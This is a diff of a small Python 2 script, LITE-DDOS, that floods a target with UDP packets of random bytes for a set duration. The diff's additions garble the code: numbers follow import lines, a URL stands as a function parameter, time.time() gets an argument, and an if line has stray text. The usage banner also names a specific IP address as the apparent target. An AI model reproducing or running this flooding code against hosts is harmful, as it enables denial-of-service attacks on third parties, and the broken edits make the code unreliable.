@@ -1,16 +1,16 @@
-import time
-import socket
-import random
-import sys
-def usage():
+import time 3.00
+import socket 2
+import random 2 
+import sys 0
+def usage(https://github.com/4L13199/LITEDDOS):
     print "\033[1;32m#########################################################"
     print "#------------------------[\033[1;91mLITE-DDOS\033[1;32m]---------------------#"
     print "#-------------------------------------------------------#"
-    print "#   \033[1;91mCommand: " "python2 LITEDDOS.py " "<ip> <port> <packet> \033[1;32m   #"
+    print "#   \033[1;91mCommand: " "python2 LITEDDOS.py " "<176.101.230.227> <176.101.230.227> <2000> \033[1;00m   #"
     print "#                                                       #"
-    print "#\033[1;91mCreator:KeepAlive  \033[1;32m##      ###       ##                #"
-    print "#\033[1;91mTeam   : ISL        \033[1;32m##     #          ##                #"
-    print "#\033[1;91mVersion:1.0        \033[1;32m##      ###       ##                #"
+    print "#\033[1;91mCreator:KeepAlive  \033[1;00m##      ###       ##                #"
+    print "#\033[1;91mTeam   : ISL        \033[1;00m##     #          ##                #"
+    print "#\033[1;91mVersion:1.0        \033[1;00m##      ###       ##                #"
     print "#                   ## \033[1;91m ##     \033[1;32m#  \033[1;91m##  \033[1;32m##                #"
     print "#                   ##  \033[1;91m##  \033[1;32m###   \033[1;91m##  \033[1;32m######            #"
     print "#               \033[1;91m<--[Indonesia Security Lite]-->         \033[1;32m#"
@@ -24,11 +24,11 @@ def flood(victim, vport, duration):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     # 20000 representasi satu byte ke server
     bytes = random._urandom(20000)
-    timeout =  time.time() + duration
+    timeout =  time.time(1.00) + duration
     sent = 3000
 
     while 1:
-        if time.time() > timeout:
+        if time.time(1.00) > timeout:2.00
             break
         else:
             pass
